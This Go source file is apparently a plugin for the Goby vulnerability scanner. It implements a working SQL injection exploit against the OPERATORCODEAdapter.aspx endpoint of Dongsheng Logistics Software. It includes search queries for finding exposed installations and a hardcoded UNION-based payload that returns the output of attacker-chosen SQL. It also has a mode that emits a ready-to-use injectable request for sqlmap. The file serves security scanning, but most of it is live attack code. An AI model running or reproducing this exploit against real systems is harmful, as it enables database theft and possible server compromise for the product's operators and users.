package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Dongsheng-Logistics-Software /FeeCodes/OPERATORCODEAdapter.aspx SQL Injection Vulnerability",
    "Description": "<p>Qingdao Dongsheng Weiye Software Technology Co., Ltd. was established in November 2004. At the beginning of its establishment, the company mainly engaged in the development and sales of shipping logistics software (freight forwarding, customs declaration). With the expansion of business, the company's main business has expanded into three major sectors, namely logistics consulting, logistics information platform and logistics software. SQL injection vulnerability exists in OPERATORCODEAdapter.aspx</p>",
    "Product": "Dongsheng-Logistics-Software",
    "Homepage": "http://www.dongshengsoft.com/",
    "DisclosureDate": "2024-10-25",
    "PostTime": "2024-10-25",
    "Author": "3013320359@qq.com",
    "FofaQuery": "body=\"dongshengsoft\" && title=\"登录\" || body=\"theme/dhtmlxcombo.css\"",
    "GobyQuery": "body=\"dongshengsoft\" && title=\"登录\" || body=\"theme/dhtmlxcombo.css\"",
    "Level": "2",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtaininformation in the database (for example, theadministrator's back-end password, the user's personalinformation of the site), an attacker can write a Trojanhorse to the server even in a high-privileged situation tofurther obtain server system permissions.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to themanufacturer's homepage update: <a href=\"https://blog.kikiw.cn/index.php/archives/65/\"></a></p><p><a href=\"http://www.dongshengsoft.com/\">http://www.dongshengsoft.com/</a></p><p>2. Deploy a web application firewall to monitor database operations.  </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://blog.csdn.net/weixin_45597678/article/details/142267948"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlpoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "DB_NAME()",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "HW-2024"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7",
    "Translation": {
        "CN": {
            "Name": "东胜物流软件 /FeeCodes/OPERATORCODEAdapter.aspx SQL 注入漏洞",
            "Product": "东胜物流软件",
            "Description": "<p>青岛东胜伟业软件科技有限公司成立于2004年11月,公司创立之初以开发、销售航运物流软件(货代、报关)为主业,随着业务的拓展,公司主业扩展为三大板块,分别为物流咨询、物流信息平台、物流软件。该软件OPERATORCODEAdapter.aspx存在SQL注入漏洞<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"http://www.dongshengsoft.com/\">http://www.dongshengsoft.com/</a><a href=\"https://blog.kikiw.cn/index.php/archives/65/\"></a></p><p>2、部署Web应⽤防⽕墙，对数据库操作进⾏监控。&nbsp;&nbsp;</p><p>3、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>攻击者除了可以利⽤ SQL 注⼊漏洞获取数据库中的信息（例如，管理员后台密码、站点的⽤户个⼈信息）之外，甚⾄在⾼权限的情况可向服务器中写⼊⽊⻢，进⼀步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "Dongsheng-Logistics-Software /FeeCodes/OPERATORCODEAdapter.aspx SQL Injection Vulnerability",
            "Product": "Dongsheng-Logistics-Software",
            "Description": "<p>Qingdao Dongsheng Weiye Software Technology Co., Ltd. was established in November 2004. At the beginning of its establishment, the company mainly engaged in the development and sales of shipping logistics software (freight forwarding, customs declaration). With the expansion of business, the company's main business has expanded into three major sectors, namely logistics consulting, logistics information platform and logistics software. SQL injection vulnerability exists in OPERATORCODEAdapter.aspx<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to themanufacturer's homepage update:&nbsp;<a href=\"https://blog.kikiw.cn/index.php/archives/65/\"></a></p><p><a href=\"http://www.dongshengsoft.com/\">http://www.dongshengsoft.com/</a><br></p><p>2. Deploy a web application firewall to monitor database operations.&nbsp;&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtaininformation in the database (for example, theadministrator's back-end password, the user's personalinformation of the site), an attacker can write a Trojanhorse to the server even in a high-privileged situation tofurther obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9966"
}`

	sendPayload_XHMI2vS1W06W := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		//GET请求
		setGetRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(url)
			GetRequest.Timeout = 12
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		//拼接sql语句
		var payload string
		payload = `x%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28106%29%2BCHAR%28113%29%2BISNULL%28CAST%28` + sql + `%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28122%29%2BCHAR%28122%29%2BCHAR%28113%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20JybD&rName=&CUSTOMERNAME=%27%29%20AND%20%28SELECT%20CHAR%28113%29%2BCHAR%28122%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28CASE%20WHEN%20%28CHARINDEX%28CHAR%2849%29%2BCHAR%2854%29%2BCHAR%2846%29%2BCHAR%2848%29%2BCHAR%2846%29%2C%40%40VERSION%29%3E0%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28113%29%29=1--%20VEQc`
		url := `/FeeCodes/OPERATORCODEAdapter.aspx?SHOWNAME=` + payload

		header := map[string]string{
			"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
			"Connection": "Keep-Alive",
		}
		resp, err := setGetRequest(hostInfo, url, header)
		if err != nil {
			return nil, err
		}
		//状态码可自定义,这里默认200
		if resp.StatusCode != 200 {
			return nil, errors.New("not response 200")
		}
		return resp, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			sendPayload := sendPayload_XHMI2vS1W06W
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符,(select sql from sqlite_master)查询表名
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符

			//检测逻辑,联合注入检测 这里模仿了sqlmap的检测逻辑,让它成功执行sql语句并回显一个字符串,然后我们去匹配

			//如果是其他类型的注入,请按照具体情况进行检测
			sql := "DB_NAME()"
			resp, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if !strings.Contains(resp.Utf8Html, "qjkjq") {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + `/FeeCodes/OPERATORCODEAdapter.aspx`
			return true
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sendPayload := sendPayload_XHMI2vS1W06W
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			sql := goutils.B2S(stepLogs.Params["sql"])
			//Switch ExpParams
			//若自己修改ExpParams,请自行修改switch case
			switch attackType {
			case "sql":
				resp, err := sendPayload(expResult.HostInfo, sql)
				if err != nil && strings.Contains(err.Error(), "not response 200") {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				// 正则匹配利用结果,需自己修改
				// 注意正则匹配返回的结果的数组序号,一般是mathch[1],请先检测到是否匹配到内容,防止panic
				re := regexp.MustCompile(`qjkjq([\s\S]*?)qzzzq`)
				matches := re.FindAllStringSubmatch(resp.Utf8Html, -1)
				var sqlinformation string
				for _, match := range matches {
					sqlinformation = match[1]
				}
				if len(sqlinformation) < 1 {
					//正则失败
					expResult.Output = `Exploitation failed.`
					expResult.Success = false
					return expResult
				}
				expResult.Success = true

				expResult.Output = `The key points you need to extract is : ` + sqlinformation
				return expResult

			case "sqlpoint":
				sql := "DB_NAME()"
				_, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `Exploitation failed: ` + err.Error()
					expResult.Success = false
					return expResult
				}
				//sqlPoint,给用户跑sqlmap用,需修改对应的参数
				expResult.Success = true
				expResult.Output = `GET /FeeCodes/OPERATORCODEAdapter.aspx?SHOWNAME=x%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28106%29%2BCHAR%28113%29%2BISNULL%28CAST%28DB_NAME%28%29%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28122%29%2BCHAR%28122%29%2BCHAR%28113%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20JybD&rName=&CUSTOMERNAME=%27%29%20AND%20%28SELECT%20CHAR%28113%29%2BCHAR%28122%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28CASE%20WHEN%20%28CHARINDEX%28CHAR%2849%29%2BCHAR%2854%29%2BCHAR%2846%29%2BCHAR%2848%29%2BCHAR%2846%29%2C%40%40VERSION%29%3E0%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28113%29%29=1--%20VEQc HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Connection: Keep-Alive
`
				return expResult
			//检查ExpParams是否设置正确
			default:
				expResult.Output = `Unknown attack type: ` + attackType
				expResult.Success = false
				return expResult
			}
		},
	))
}
